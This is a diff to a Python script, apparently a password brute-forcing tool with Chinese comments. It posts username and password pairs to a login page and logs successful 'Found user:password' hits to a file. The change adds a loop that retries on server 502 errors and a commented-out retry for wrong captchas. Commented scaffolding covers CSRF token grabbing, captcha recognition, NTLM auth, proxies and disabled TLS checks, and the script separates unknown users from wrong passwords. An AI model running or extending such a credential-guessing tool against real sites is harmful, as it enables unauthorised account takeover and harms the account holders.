@@ -234,35 +234,53 @@ def run(username, password):
     try:
         url = "https://example.com"
         session = requests.Session()
-        
-        # 可以先用 session 请求一次 CSRF Token / Cookie 再发起登录请求
-        #response = session.get(url + "/login.html",
-        #    headers=HEADERS, cookies=COOKIES, timeout=10, 
-        #    allow_redirects=False, verify=False, proxies=PROXIES if USE_PROXY else None)
-        #html = etree.HTML(response.text, etree.HTMLParser())
-        #token = html.xpath('//input[@type="hidden" and @id="csrf"]/@value')[0]
 
-        # 这里selenium可以自动识别username和password是string类型，并自动加上双引号
-        #username_encrypted = BROWSER.execute_script('return cipher.encrypt(arguments[0])', username)
-        #password_encrypted = BROWSER.execute_script('return cipher.encrypt(arguments[0])', password)
-        
-        # NTLM认证示例
-        #response = session.get(url + "/index.html", auth=HttpNtlmAuth(username, password))
-        #response = session.get(url + "/index.html", auth=HttpNtlmAuth(f"domain\\{username}", password))
-        
-        # 验证码识别
-        # response = session.get(url + "/login/vcode",
-        #     headers=HEADERS, cookies=COOKIES, timeout=10, 
-        #     allow_redirects=False, verify=False, proxies=PROXIES if USE_PROXY else None)
-        # captcha = captchadet.identify(MODEL, response.content)
+        # 在某种条件下会尝试重复请求，如验证码识别错误，服务器响应502等
+        error = {}
+        # error["captcha"] = 0
+        error["502"] = 0
+        while True:
+            # 可以先用 session 请求一次 CSRF Token / Cookie 再发起登录请求
+            #response = session.get(url + "/login.html",
+            #    headers=HEADERS, cookies=COOKIES, timeout=10, 
+            #    allow_redirects=False, verify=False, proxies=PROXIES if USE_PROXY else None)
+            #html = etree.HTML(response.text, etree.HTMLParser())
+            #token = html.xpath('//input[@type="hidden" and @id="csrf"]/@value')[0]
 
-        data = {
-            "username": username,
-            "password": password
-        }
-        response = session.post(url + "/login.html",
-            data=data, headers=HEADERS, cookies=COOKIES, timeout=10, 
-            allow_redirects=False, verify=False, proxies=PROXIES if USE_PROXY else None)
+            # 这里selenium可以自动识别username和password是string类型，并自动加上双引号
+            #username_encrypted = BROWSER.execute_script('return cipher.encrypt(arguments[0])', username)
+            #password_encrypted = BROWSER.execute_script('return cipher.encrypt(arguments[0])', password)
+            
+            # NTLM认证示例
+            #response = session.get(url + "/index.html", auth=HttpNtlmAuth(username, password))
+            #response = session.get(url + "/index.html", auth=HttpNtlmAuth(f"domain\\{username}", password))
+            
+            # 验证码识别
+            # response = session.get(url + "/login/vcode",
+            #     headers=HEADERS, cookies=COOKIES, timeout=10, 
+            #     allow_redirects=False, verify=False, proxies=PROXIES if USE_PROXY else None)
+            # captcha = captchadet.identify(MODEL, response.content)
+
+            data = {
+                "username": username,
+                "password": password
+            }
+            response = session.post(url + "/login.html",
+                data=data, headers=HEADERS, cookies=COOKIES, timeout=10, 
+                allow_redirects=False, verify=False, proxies=PROXIES if USE_PROXY else None)
+            
+            if response.status_code == 502:
+                error["502"] += 1
+                if error["502"] > 5:
+                    raise Exception("Server internal error")
+                continue
+            # elif "验证码有误" in response.text:
+            #     error["captcha"] += 1
+            #     if error["captcha"] > 5:
+            #         raise Exception("Incorrect captcha")
+            #     continue
+            else:
+                break
 
         # if len(response.content) == 100:
         # if response.status_code == 401:
@@ -274,9 +292,6 @@ def run(username, password):
         if "Unknown user" in response.text:
             return True, False
         
-        # if "验证码错误" in response.text:
-        #     raise Exception("Incorrect captcha")
-
         # 找到密码
         output = f"[++] {datetime.now().strftime('%H:%M:%S')} Found {username}:{password}\t\t=> code:{response.status_code} length:{len(response.content)}"
         write_to_file(FOUND_OUTPUT_PATH, FOUND_OUTPUT_LOCK, f"{output}\n")
